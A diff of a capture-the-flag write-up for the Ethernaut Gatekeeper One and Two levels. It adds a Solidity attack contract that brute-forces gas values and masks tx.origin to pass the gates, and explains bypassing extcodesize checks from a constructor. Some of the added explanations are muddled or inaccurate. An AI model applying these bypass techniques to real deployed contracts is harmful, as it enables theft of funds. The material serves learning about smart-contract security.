@@ -421,59 +421,77 @@ Gate 1
 Solution to the first gate is trivial, just use a contract as a middleman. From previous puzzles we have learned that msg.sender is the immediate sender of a transaction, which may be a contract; however, tx.origin is the originator of the transaction which is usually us.
 
 Gate 2
-Here we need to adjust the gas used in the transaction. We can do this by specifying the gas to be forwarded similar to how we specify ether value: foo{gas: ...}(). To find the proper gas amount is the tricky part, because we don't know exactly how much gas we will have by then. Here is what we can do: we will find a good approximate gas value, and then brutely try a range of values around it. The steps to do that is as follows:
-
+Here we have to ensure that remaining gas is an integer multiple of 8191, running the loop below  is the best way I found online while researching on how to solve this level, 
 ```
-  function enterOnce(uint _gas) public {
-    bytes memory callbytes = abi.encodeWithSignature(("enter(bytes8)"),key);
-    (bool success, ) = target.call{gas: _gas}(callbytes);
-    require(success, "failed");
-  }
+ for (uint256 i = 0; i < 120; i++) {
+      (bool result, bytes memory data) = address(gKeeperOne).call{gas:
+          i + 150 + 8191*3}(abi.encodeWithSignature(("enter(bytes8)"),
+      key
+    ));
 ```
-
-Copy paste the contract in Remix, and try to enter the gate (assuming that gate 1 is passing at this point). I wrote a small utility for this in my attacker contract, shown above.
-
-Unless we are extremely lucky, the transaction will be rejected by this gate. That is ok, because we want to debug it!
-
-Debug the transaction in Remix to get to the GAS opcode, which is what gasleft() is doing in the background. There, we will look at the remaining gas field in "Step Details". We can easily get there in several ways:
-
-Clicking "Click here to jump where the call reverted." and then going backward a bit until you find the opcode.
-Putting a breakpoint to the line with gasleft() and clicking right arrow at the debugger, which will go very close to that opcode.
-Another cool way is to actually get inside the SafeMath libraries modulus function, and then look at the local variables in the debugger. One of them will be 8191, the other will be the gas in question.
-In my case, I had forwarded 10000 gas and right at the GAS opcode I had 9748 left. That means I used 252 gas to get there. If I start with 8191 \* k + 252 gas for some large enough "k" to meet the overall gas requirement, I should be okay! The thing is, gas usage can change with respect to the compiler version, but in the puzzle we see that ^0.6.0 is used above, so we will do all the steps above with that version.
-
-I set the gas candidate as 8191 \* 5 + 252 = 41207 with a margin of 32. Then I let it loose on the gate keeper!
-
-function enter(uint \_gas, uint \_margin) public {
-bytes memory callbytes = abi.encodeWithSignature(("enter(bytes8)"),key);
-bool success;
-for (uint g = \_gas - \_margin; g <= \_gas + \_margin; g++) {
-(success, ) = target.call{gas: g}(callbytes);
-if (success) {
-correctGas = g; // for curiosity
-break;
-}
-}
-require(success, "failed again my boy.");
-}
-It was successful, and I also kept record of the correct gas amount which turned out to be 41209.
-
+Cause using this method we are brute forcing the key rather than having to use trial ad error to match the mod condition
+` require(gasleft() % 8191 == 0) `
 Gate 3
 We are using an 8-byte key, so suppose the key is ABCD where each letter is 2 bytes (16 bits).
 
 CD == D so C: must be all zeros.
 CD != ABCD so AB must not be all zeros.
 CD == uint16(tx.origin): C is already zeros, and now we know that D will be the last 16-bits of tx.origin.
-So, my uint16(tx.origin) is C274; and I will just set AB = 0x 0000 0001 to get \_gateKey = 0x 0000 0001 0000 C274. Alternatively, you can use bitwise masking by bitwise-and'ing (&) your tx.origin with 0x FFFF FFFF 0000 FFFF.
+This means that the integer key, when converted into various byte sizes, need to fulfil the following properties:
 
-That is all folks :)
+0x11111111 == 0x1111, which is only possible if the value is masked by 0x0000FFFF
+0x1111111100001111 != 0x00001111, which is only possible if you keep the preceding values, with the mask 0xFFFFFFFF0000FFFF
+3. Calculate the key using the0xFFFFFFFF0000FFFF mask:
+```
+bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
+```
+Alternatively, we can get our uint16(tx.origin); and then just set AB = 0x 0000 0001 to get \_gateKey = 0x 0000 0001 0000 XXXX, where XXXX is uint16(tx.origin)
+Below is the Gatekeeper attacking code to use in remix
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import './Gatekeeper.sol';
+
+contract AreYouTheKeyOwner{
+    using SafeMath for uint256;
+    bytes8 txOrigin16 = 0x5899BD5B5CE8072a; //last 16 digits of our account
+    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
+    GatekeeperOne public gKeeperOne;
+    
+
+    function setGatekeeperOne(address _addr) public {
+    gKeeperOne = GatekeeperOne(_addr);
+}
+
+function AlowMeIn() public{
+    for (uint256 i = 0; i < 120; i++) {
+      (bool result, bytes memory data) = address(gKeeperOne).call{gas:
+          i + 150 + 8191*3}(abi.encodeWithSignature(("enter(bytes8)"),
+      key
+    ));
+      if(result)
+        {
+        break;
+      }
+    }
+   }
+
+}
+```
+
+Whew, that was a lot, advisably check what masking opearations to understand more on how the 3rd gate was passed
+
+MAIN TAKEAWAY FROM CHALLENGE:
+Always remember that data corrupts when converted to diferent types or sizes, and also masking optimises gas as this way there are less operations instead of typecasting, and lastly asserting gas consumptions in contracts is not really a smart thing to do as different compiler settings will yield different results.
+
 
 ## 14. Gatekeeper Two
 
 Very similar to the previous level except it requires us to know a little bit more about bitwise operations (specifically XOR) and about `extcodesize`.
 
 1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address.
-2. `gateTwo` is a bit tricky because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor!
+2. At first you might think `gateTwo` is a bit tricky because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor!
    Here is the real gate
 
 ```
@@ -485,7 +503,8 @@ modifier gateTwo() {
 }
 ```
 
-The extcodesize basically returns the size of the code in the given address, which is caller for this case. Contracts have code, and user accounts do not. To have 0 code size, you must be an account; but wait, how will we pass the first gate if that is the case? Here is the trick of this gate: extcodesize returns 0 if it is being called in the constructor!  
+The extcodesize basically returns the size of the code in the given address, which is caller for this case. Contracts have code, and user accounts do not. So some developers might want only EOAs to interact with their contracts and have this as a requirement, but from this challenge we can already see that `extcodesize` being equal to zero does not necessarily mean that the caller is an EOA.
+Here is the trick of this gate: extcodesize returns 0 if it is being called in the constructor!  
 In short, we have to execute our attack from within the constructor, cause when we first deploy a contract, the extcodesize of that address is 0 until the constructor is completed!
 Check this stack convo for more understanding on extcodesize "https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract/15642#15642"
 
